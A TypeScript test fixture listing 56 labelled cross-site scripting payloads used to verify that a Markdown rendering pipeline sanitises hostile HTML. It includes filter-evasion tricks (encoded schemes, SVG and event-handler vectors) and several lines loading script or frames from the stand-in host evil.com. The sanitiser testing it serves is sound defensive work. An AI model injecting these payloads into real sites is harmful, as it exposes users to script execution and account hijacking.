/**
 * XSS test payload suite (A8, ADR-008).
 *
 * Grouped into 7 categories with 56 distinct hostile payloads.
 * Used by render-xss.test.ts to verify the RSC Markdown rendering pipeline.
 */

export interface XssPayload {
  id: string;
  category:
    | "script-tags"
    | "event-handlers"
    | "dangerous-schemes"
    | "entity-unicode"
    | "nested-html"
    | "svg-vectors"
    | "markdown-link-tricks";
  name: string;
  payload: string;
}

export const XSS_PAYLOADS: XssPayload[] = [
  // 1. Script tags
  { id: "ST-01", category: "script-tags", name: "Basic script tag", payload: "<script>alert(1)</script>" },
  { id: "ST-02", category: "script-tags", name: "Script with remote src", payload: '<script src="https://evil.com/xss.js"></script>' },
  { id: "ST-03", category: "script-tags", name: "Case variation script", payload: "<sCrIpt>alert(1)</ScRipt>" },
  { id: "ST-04", category: "script-tags", name: "Script with extra attributes", payload: '<script type="text/javascript" async>alert(1)</script>' },
  { id: "ST-05", category: "script-tags", name: "Script with line break in tag", payload: "<script\n>alert(1)</script\n>" },
  { id: "ST-06", category: "script-tags", name: "Unclosed script tag", payload: "<script>alert(1)" },
  { id: "ST-07", category: "script-tags", name: "Script tag with null byte", payload: "<script\x00>alert(1)</script>" },
  { id: "ST-08", category: "script-tags", name: "Script tag in comment break", payload: "<!--<script>alert(1)</script>-->" },

  // 2. Event handlers
  { id: "EH-01", category: "event-handlers", name: "Image onerror", payload: '<img src="x" onerror="alert(1)">' },
  { id: "EH-02", category: "event-handlers", name: "Body onload", payload: '<body onload="alert(1)">' },
  { id: "EH-03", category: "event-handlers", name: "Input autofocus onfocus", payload: '<input autofocus onfocus="alert(1)">' },
  { id: "EH-04", category: "event-handlers", name: "Div onmouseover", payload: '<div onmouseover="alert(1)">Hover me</div>' },
  { id: "EH-05", category: "event-handlers", name: "Video onerror", payload: '<video><source onerror="alert(1)"></video>' },
  { id: "EH-06", category: "event-handlers", name: "Marquee onstart", payload: '<marquee onstart="alert(1)">test</marquee>' },
  { id: "EH-07", category: "event-handlers", name: "Details ontoggle", payload: '<details open ontoggle="alert(1)">test</details>' },
  { id: "EH-08", category: "event-handlers", name: "Button onclick", payload: '<button onclick="alert(1)">click</button>' },
  { id: "EH-09", category: "event-handlers", name: "Uppercase ONERROR", payload: '<img src=x ONERROR="alert(1)">' },

  // 3. Dangerous schemes (javascript:, data:, vbscript:)
  { id: "DS-01", category: "dangerous-schemes", name: "javascript: in link href", payload: '<a href="javascript:alert(1)">click</a>' },
  { id: "DS-02", category: "dangerous-schemes", name: "data:text/html in link href", payload: '<a href="data:text/html,<script>alert(1)</script>">click</a>' },
  { id: "DS-03", category: "dangerous-schemes", name: "vbscript: in link href", payload: '<a href="vbscript:msgbox(1)">click</a>' },
  { id: "DS-04", category: "dangerous-schemes", name: "javascript: with tab", payload: '<a href="java\tscript:alert(1)">click</a>' },
  { id: "DS-05", category: "dangerous-schemes", name: "javascript: with newline", payload: '<a href="java\nscript:alert(1)">click</a>' },
  { id: "DS-06", category: "dangerous-schemes", name: "javascript: with spaces", payload: '<a href="   javascript:alert(1)">click</a>' },
  { id: "DS-07", category: "dangerous-schemes", name: "javascript: URL encoded", payload: '<a href="javascript%3Aalert(1)">click</a>' },
  { id: "DS-08", category: "dangerous-schemes", name: "iframe src javascript", payload: '<iframe src="javascript:alert(1)"></iframe>' },

  // 4. Entity and unicode tricks
  { id: "EU-01", category: "entity-unicode", name: "HTML decimal entity in scheme", payload: '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>' },
  { id: "EU-02", category: "entity-unicode", name: "HTML hex entity in scheme", payload: '<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">click</a>' },
  { id: "EU-03", category: "entity-unicode", name: "Entity encoded script tags", payload: "&lt;script&gt;alert(1)&lt;/script&gt;" },
  { id: "EU-04", category: "entity-unicode", name: "Null byte in entity", payload: '<a href="jav&#x00;ascript:alert(1)">click</a>' },
  { id: "EU-05", category: "entity-unicode", name: "Leading zero entities", payload: '<a href="&#0000106&#0000097&#0000118&#0000097script:alert(1)">click</a>' },
  { id: "EU-06", category: "entity-unicode", name: "Fullwidth script tag", payload: "\uFF1Cscript\uFF1Ealert(1)\uFF1C/script\uFF1E" },
  { id: "EU-07", category: "entity-unicode", name: "Right-to-left override in script", payload: "\u202E<script>alert(1)</script>" },

  // 5. Nested HTML and forbidden tags
  { id: "NH-01", category: "nested-html", name: "Iframe injection", payload: '<iframe src="https://evil.com"></iframe>' },
  { id: "NH-02", category: "nested-html", name: "Object tag with data", payload: '<object data="javascript:alert(1)"></object>' },
  { id: "NH-03", category: "nested-html", name: "Embed tag", payload: '<embed src="https://evil.com/xss.swf">' },
  { id: "NH-04", category: "nested-html", name: "Style tag with expression", payload: "<style>body{background:url('javascript:alert(1)')}</style>" },
  { id: "NH-05", category: "nested-html", name: "Form with malicious action", payload: '<form action="javascript:alert(1)"><button>submit</button></form>' },
  { id: "NH-06", category: "nested-html", name: "Base tag hijacking", payload: '<base href="https://evil.com/">' },
  { id: "NH-07", category: "nested-html", name: "Meta refresh redirect", payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">' },
  { id: "NH-08", category: "nested-html", name: "Link stylesheet malicious", payload: '<link rel="stylesheet" href="javascript:alert(1)">' },
  { id: "NH-09", category: "nested-html", name: "Nested div script", payload: "<div><p><span><script>alert(1)</script></span></p></div>" },

  // 6. SVG vectors
  { id: "SV-01", category: "svg-vectors", name: "SVG with inline script", payload: "<svg><script>alert(1)</script></svg>" },
  { id: "SV-02", category: "svg-vectors", name: "SVG onload", payload: '<svg onload="alert(1)"></svg>' },
  { id: "SV-03", category: "svg-vectors", name: "SVG with animation element", payload: '<svg><animate onbegin="alert(1)" attributeName="x" dur="1s"/></svg>' },
  { id: "SV-04", category: "svg-vectors", name: "SVG with a tag xlink:href", payload: '<svg><a xlink:href="javascript:alert(1)"><text y="20">click</text></a></svg>' },
  { id: "SV-05", category: "svg-vectors", name: "SVG set element", payload: '<svg><set onbegin="alert(1)" attributeName="x"/></svg>' },
  { id: "SV-06", category: "svg-vectors", name: "SVG malformed slash onload", payload: "<svg/onload=alert(1)>" },
  { id: "SV-07", category: "svg-vectors", name: "SVG with foreignObject", payload: "<svg><foreignObject><script>alert(1)</script></foreignObject></svg>" },

  // 7. Markdown link tricks
  { id: "ML-01", category: "markdown-link-tricks", name: "Markdown link with javascript:", payload: "[click me](javascript:alert(1))" },
  { id: "ML-02", category: "markdown-link-tricks", name: "Markdown link with data: URI", payload: "[click me](data:text/html,<script>alert(1)</script>)" },
  { id: "ML-03", category: "markdown-link-tricks", name: "Markdown link with vbscript:", payload: "[click me](vbscript:msgbox(1))" },
  { id: "ML-04", category: "markdown-link-tricks", name: "Markdown link with control chars in scheme", payload: "[click me](jav\x00ascript:alert(1))" },
  { id: "ML-05", category: "markdown-link-tricks", name: "Markdown image with javascript src", payload: "![alt text](javascript:alert(1))" },
  { id: "ML-06", category: "markdown-link-tricks", name: "Markdown link with tab entity", payload: "[click me](jav&#x09;ascript:alert(1))" },
  { id: "ML-07", category: "markdown-link-tricks", name: "Markdown link protocol-relative", payload: "[click me](//evil.com/payload)" },
  { id: "ML-08", category: "markdown-link-tricks", name: "Markdown link encoded parentheses", payload: "[click me](javascript:alert%281%29)" },
];
